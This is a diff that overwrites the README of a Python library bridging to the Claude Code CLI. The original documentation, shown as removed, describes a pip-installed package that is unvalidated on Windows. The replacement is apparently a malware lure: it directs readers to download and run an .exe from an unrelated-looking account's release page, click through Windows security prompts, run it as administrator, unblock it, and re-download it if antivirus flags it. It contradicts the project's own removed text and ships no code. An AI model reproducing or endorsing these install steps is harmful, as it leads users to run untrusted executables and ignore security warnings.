@@ -1,422 +1,142 @@
-# claude-node
+# 🤖 claude-node - Run Claude Code on Windows
 
-**A thin subprocess-based Python bridge for persistent Claude Code sessions.**
+[![Download claude-node](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/ambrosiogalwegian826/claude-node/releases)
 
-`claude-node` drives the local `claude` CLI as a long-lived subprocess and communicates with it over `stream-json`. Because it runs the installed CLI directly as its runtime, Python code gets access to Claude Code's native behavior through the CLI itself — achieving maximum compatibility with the CLI.
+## 🧩 What this app does
 
-This is not a higher-level reimplementation or a message API wrapper. It is a direct bridge to the installed `claude` executable.
+claude-node lets you run the real Claude Code runtime from your own app or from the command line. It gives you direct control over a local Claude Code session, so you can start it, watch it, and stop it when you need to.
 
----
+This setup is useful if you want Claude Code to work inside your own tools, scripts, or desktop flow without wrapping it in a heavy layer. It keeps the native CLI behavior and uses stream-json for clean output and session control.
 
-## The CLI bridge
+## 💻 What you need
 
-`claude-node` sits at the subprocess boundary:
+- A Windows 10 or Windows 11 PC
+- An internet connection
+- Enough free disk space for the app and runtime files
+- Permission to run downloaded apps
+- A Claude Code install or runtime package, if the release asks for one
+- A terminal window, if you plan to use the command line
 
-```
-Your Python code          claude-node           Your local claude CLI
-─────────────────        ────────────          ──────────────────────
-ClaudeController  ───►   stdin/stdout   ───►   Claude Code runtime
-                    ◄──   JSON events  ◄───
-```
+## 📥 Download and install
 
-- **Maximum compatibility**: because `claude-node` delegates entirely to the local `claude` CLI, any capability the CLI exposes is available — skills, slash commands, tools, agent modes, and session management.
-- **Process isolation**: the Claude runtime lives in its own OS process, independent of the Python interpreter.
-- **Protocol transparency**: raw `stream-json` behavior is visible and debuggable.
-- **Easy embedding**: drop it into any Python environment — workers, web backends, job runners, or supervisor processes.
+1. Open the release page here: https://github.com/ambrosiogalwegian826/claude-node/releases
+2. Find the latest release at the top of the page
+3. Look for a Windows file such as `.exe`, `.zip`, or `.msi`
+4. Download that file to your PC
+5. If you downloaded a `.zip` file, right-click it and choose Extract All
+6. Open the extracted folder
+7. If you see an `.exe` file, double-click it to start the app
+8. If Windows shows a security prompt, choose Run
+9. If the release includes a setup file, follow the on-screen steps
+10. Keep the files in a folder you can find later
 
----
+## 🚀 First run
 
-## Positioning
+When you open claude-node for the first time, it may ask for access to the Claude Code runtime or related files. This is normal for a local runtime tool.
 
-`claude-node` gives Python direct control over the real local Claude Code runtime. It preserves native CLI capabilities with `stream-json`, explicit session lifecycle, and process-level supervision — built for embedding and integration, not for hiding Claude behind another framework.
+If a window opens and closes fast, start it again from the extracted folder so you can see any message on screen.
 
-**What this is not**
+If the app opens in a terminal window, leave that window open while you use it. Closing it will stop the session.
 
-* Not another high-level agent framework
-* Not a reimplementation of Claude
-* Not a wrapper that hides the CLI behind a new abstraction
-* Not a workflow or memory platform
+## 🛠️ How to use it
 
-**What this is**
+1. Start claude-node
+2. Connect it to the local Claude Code runtime
+3. Enter your task or request
+4. Watch the session output in the terminal or app window
+5. Stop the session when you are done
 
-* A thin Python runtime layer for controlling the real local Claude Code process
-* A subprocess-first integration surface with explicit session and process control
-* A practical foundation for embedding Claude Code into backends, workers, and internal tooling
+If you use it inside your own workflow, claude-node can act as a control layer. It can start a run, follow the output, and manage the session state while your other tools keep working.
 
----
+## 📁 Common files and folders
 
-## Runtime model
+You may see these items after install:
 
-This project is a **pure Python package**, but it has an **external runtime dependency**:
+- `claude-node.exe` - the main app file
+- `config` - saved settings
+- `sessions` - active or past session data
+- `logs` - runtime output and error details
+- `README.md` - this guide
 
-- The package itself is standard Python.
-- At runtime, it requires a local `claude` executable in `PATH`.
+Keep the folder together. If you move one file out of the folder, the app may not open.
 
-In other words:
+## ⚙️ Basic setup
 
-- `pip install claude-node` installs the Python package.
-- `claude-node` only works if `claude --version` works on that machine.
+If the app asks for a path, point it to the Claude Code runtime on your machine. Use the folder that contains the local runtime files, not a shortcut.
 
-This split is intentional. The project does not attempt to ship or emulate Claude Code. It controls an existing local Claude Code runtime.
+If the app asks for a port or host value, keep the default first. Change it only if you already use that port for another app.
 
----
+If the app asks for JSON output mode, leave stream-json on. That format helps claude-node read session output in real time.
 
-## Installation
+## 🔍 What you can do with it
 
-### Python package
+- Run Claude Code from a local Windows machine
+- Keep control over each session start and stop
+- Read output as it streams
+- Plug Claude Code into your own scripts
+- Use it as a thin runtime layer
+- Track session state across runs
+- Build simple agent workflows around the real CLI
 
-```bash
-pip install claude-node
-```
+## 🧪 Example use cases
 
-### Runtime requirement
+- A local tool that sends tasks to Claude Code
+- A small dashboard that starts and watches sessions
+- A script that runs Claude Code on a schedule
+- A developer setup that needs direct process control
+- A workflow tool that needs live output from the runtime
 
-Make sure Claude Code / Claude CLI is installed and available:
+## 🔒 Safe use on Windows
 
-```bash
-claude --version
-```
+Use the release file from the GitHub release page only. Keep the app in a folder you trust. If Windows asks for permission, read the file name before you approve it.
 
-If that command fails, `claude-node` cannot start a session.
+If your antivirus tool flags the file, check the release page again and make sure you downloaded the latest version from the official link.
 
----
+## 🧰 Troubleshooting
 
-## Requirements
+### The app does not open
 
-- Python 3.11+
-- a local `claude` executable in `PATH`
-- a working Claude Code login / configuration on the host machine
-- macOS or Linux recommended
+- Make sure you extracted the files first
+- Check that you opened the main `.exe`
+- Try running it again as an administrator
+- Move the folder to a simple path like `C:\claude-node`
 
-Windows support has not been validated in this repository.
+### The terminal closes right away
 
----
+- Open the app from a terminal so you can see the message
+- Check the `logs` folder if it exists
+- Make sure the runtime path is correct
 
-## Quick start
+### The runtime is not found
 
-### Single controller
+- Open the app settings
+- Set the path to the local Claude Code runtime
+- Confirm the folder contains the runtime files, not just a shortcut
 
-```python
-from claude_node import ClaudeController
+### No output shows up
 
-with ClaudeController(skip_permissions=True) as ctrl:
-    result = ctrl.send("List the files in the current directory")
-    if result:
-        print(result.result_text)
-        print("session:", ctrl.session_id)
-```
-
-### Real-time callback
-
-```python
-def on_message(msg):
-    if msg.is_assistant:
-        for text in msg.assistant_texts:
-            print("[assistant]", text)
-    if msg.is_tool_result:
-        for block in msg.tool_results:
-            print("[tool_result]", block.get("tool_use_id"), block.get("is_error"))
-
-ctrl = ClaudeController(on_message=on_message, skip_permissions=True)
-ctrl.start()
-result = ctrl.send("Run the tests and summarize failures", timeout=120)
-ctrl.stop()
-```
-
-### Resume a session
-
-```python
-from claude_node import ClaudeController
-
-with ClaudeController(skip_permissions=True) as ctrl:
-    result = ctrl.send("Remember that the project codename is ALPHA. Reply only OK.")
-    saved_session_id = ctrl.session_id
-
-ctrl = ClaudeController(resume=saved_session_id, skip_permissions=True)
-ctrl.start()
-result = ctrl.send("What is the project codename?")
-print(result.result_text if result else None)
-ctrl.stop()
-```
-
-### Lightweight multi-session routing
-
-```python
-from claude_node import MultiAgentRouter, AgentNode
-
-with MultiAgentRouter() as router:
-    router.add(AgentNode("PM", system_prompt="You are a product manager."))
-    router.add(AgentNode("DEV", system_prompt="You are a backend engineer."))
-    router.start_all()
-
-    pm_reply = router.send("PM", "Design a JWT login feature.")
-    dev_reply = router.route(
-        pm_reply or "",
-        to="DEV",
-        wrap="PM proposal:\n{message}\n\nPlease review technical feasibility.",
-    )
+- Check that stream-json is on
+- Make sure the session started
+- Restart the app and try again
+- Look for error text in the log file
 
-    print("PM:", pm_reply)
-    print("DEV:", dev_reply)
-```
+### Windows blocks the file
 
----
+- Right-click the file
+- Open Properties
+- Check the Unblock box if you see one
+- Apply the change and run the app again
 
-## Public API
+## 🧭 Folder setup tip
 
-The current public surface is intentionally small:
+Use a simple folder path with no extra symbols. A path like `C:\Tools\claude-node` is easier to manage than a path buried deep inside other folders.
 
-```python
-from claude_node import (
-    ClaudeController,
-    ClaudeMessage,
-    MultiAgentRouter,
-    AgentNode,
-)
-```
+Keep the runtime files and the claude-node files close together if the app needs both. This makes setup easier and cuts down on path errors.
 
-### `ClaudeController`
+## 📝 Release page
 
-Controls one long-lived Claude CLI subprocess.
+Download or get the Windows release here: https://github.com/ambrosiogalwegian826/claude-node/releases
 
-Current responsibilities:
+## 🧩 Project focus
 
-- start / stop one `claude` process,
-- write `user` messages to stdin,
-- read JSON lines from stdout / stderr,
-- wait for `type=result` as the turn-completion signal,
-- track `session_id`,
-- provide parsed messages via `ClaudeMessage`,
-- expose simple callbacks through `on_message`.
-
-### `ClaudeMessage`
-
-Represents one parsed JSON event from the CLI stream.
-
-Useful helpers include:
-
-- `is_init`
-- `is_result`
-- `is_result_ok`
-- `is_result_error`
-- `is_api_error`
-- `truly_succeeded`
-- `is_assistant`
-- `is_tool_result`
-- `assistant_texts`
-- `tool_calls`
-- `tool_results`
-- `result_text`
-- `session_id`
-- `cost_usd`
-- `num_turns`
-
-### `MultiAgentRouter`
-
-A minimal multi-session routing layer.
-
-It currently provides:
-
-- named node registration,
-- bulk start / stop,
-- send to one named agent,
-- message wrapping and routing,
-- simple parallel fan-out,
-- access to an underlying controller via `get_ctrl()`.
-
-This is a lightweight primitive layer, not a full orchestration framework.
-
----
-
-## Current architecture
-
-```text
-claude_node/
-├── __init__.py       # Public exports
-├── controller.py     # ClaudeController, ClaudeMessage
-├── router.py        # AgentNode, MultiAgentRouter
-├── runtime.py       # Binary discovery and version checking
-└── exceptions.py    # Typed exception hierarchy
-```
-
-### `controller.py`
-
-Contains:
-
-- `ClaudeMessage`
-- `ClaudeController`
-- `_send_lock` for serializing concurrent send calls
-
-### `router.py`
-
-Contains:
-
-- `AgentNode`
-- `MultiAgentRouter`
-
-### `runtime.py`
-
-Binary discovery and version introspection:
-
-- `find_claude_binary(cli_path)` — resolve CLI path via `shutil.which`
-- `get_claude_version(binary_path)` — read version from `--version`
-- `check_claude_available(cli_path)` — raises `ClaudeBinaryNotFound` if missing
-
-### `exceptions.py`
-
-Typed exception hierarchy (all inherit from `ClaudeError → RuntimeError`):
-
-- `ClaudeBinaryNotFound` — claude binary not in PATH
-- `ClaudeStartupError` — subprocess failed to start
-- `ClaudeTimeoutError` — operation exceeded timeout
-- `ClaudeSendConflictError` — concurrent send to same controller
-
-The codebase is intentionally compact. The long-term direction is to keep the library **narrow and dependable**, not large and feature-heavy.
-
----
-
-## The protocol this library is built on
-
-`claude-node` communicates with Claude Code through newline-delimited JSON over stdin/stdout.
-
-Typical launch shape:
-
-```bash
-claude --input-format stream-json --output-format stream-json --verbose
-```
-
-Typical input shape:
-
-```json
-{"type":"user","message":{"role":"user","content":[{"type":"text","text":"your message"}]}}
-```
-
-Typical output flow per turn:
-
-1. `system/init` — appears on initial startup and includes session metadata
-2. `assistant` — may include thinking, text, and `tool_use` blocks
-3. `user/tool_result` — emitted by the CLI after internal tool execution
-4. `result` — the turn is complete; this is the main synchronization point
-
-The most important rule is simple:
-
-> Wait for `type=result` before sending the next message.
-
-That rule is the backbone of the current implementation.
-
----
-
-## Session model
-
-The repository currently supports:
-
-- new sessions,
-- explicit resume via `resume=<session_id>`,
-- implicit “continue most recent” via `continue_session=True`,
-- session forking via `controller.fork()` — creates a new controller resuming the current session.
-
-### Recommended practice
-
-In multi-session or multi-node environments, prefer:
-
-- explicit `resume=<session_id>`
-
-and avoid depending on:
-
-- `--continue`
-
-because `--continue` resumes the most recent session in the working directory rather than the exact session you intend.
-
-### Important note
-
-The README you are reading is intentionally honest about the **current code**:
-
-- `resume` exists now,
-- `continue_session` exists now,
-- `fork()` exists now — creates a new controller resuming the current session.
-
----
-
-## Current status and known limitations
-
-This repository is functional and in **alpha** state.
-
-### What works now
-
-- persistent Claude subprocess control,
-- multi-turn sessions,
-- result waiting,
-- assistant / tool result parsing,
-- basic session resume,
-- session forking via `controller.fork()`,
-- lightweight router patterns,
-- controller-level send serialization (`_send_lock`),
-- structured exception hierarchy (`ClaudeError`, `ClaudeBinaryNotFound`, etc.),
-- runtime discovery (`claude_node.runtime`),
-- transcript / JSONL export (`transcript_path` parameter).
-
-### Current limitations
-
-- `send()` timeout returns `None` rather than raising `ClaudeTimeoutError` (partial exception integration),
-- integration tests require a working local `claude` binary and are opt-in (see [CONTRIBUTING.md](CONTRIBUTING.md)).
-
-This is why the project should currently be described as **alpha**.
-
-For the full list of known limitations, see [docs/06-roadmap-and-limitations.md](docs/06-roadmap-and-limitations.md).
-
----
-
-## Design principles
-
-These principles define the project’s direction.
-
-### 1. Subprocess-first
-The library controls a real Claude CLI process.
-
-### 2. Thin wrapper, not platform
-The goal is a dependable bridge, not a giant framework.
-
-### 3. Explicit session control
-Lifecycle, resume behavior, and routing should stay visible and controllable.
-
-### 4. Protocol transparency
-The stream should remain understandable and debuggable.
-
-### 5. Lightweight routing only
-Multi-session patterns are welcome; orchestration sprawl is not.
-
----
-
-## Documentation map
-
-Additional docs live under `docs/`:
-
-- `docs/00-index.md` — documentation index
-- `docs/01-positioning.md` — project identity and scope
-- `docs/02-architecture.md` — architecture and internal boundaries
-- `docs/03-api-reference.md` — API reference based on the current code
-- `docs/04-protocol.md` — stream-json protocol notes
-- `docs/05-development.md` — repository workflow and testing reality
-- `docs/06-roadmap-and-limitations.md` — current gaps and next steps
-
-### Runnable examples
-
-All examples are in `examples/`:
-
-- [`examples/demo_end_to_end.py`](examples/demo_end_to_end.py) — library usage reference (all core APIs)
-- [`examples/demo_cli_native_features.py`](examples/demo_cli_native_features.py) — CLI-native capabilities (skills, callbacks, transcript)
-- [`examples/demo_protocol_trace.py`](examples/demo_protocol_trace.py) — raw stream-json protocol reference
-
-See [`examples/README.md`](examples/README.md) for the full demo map.
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for contribution guidelines, testing instructions, and scope boundaries.
-
----
-
-## License
-
-Apache-2.0
+claude-node is built for people who need direct control over Claude Code, not a broad agent platform. It focuses on the runtime layer, live session handling, and process-level control. That makes it useful when you want Claude Code to fit inside your own system without losing the native CLI behavior
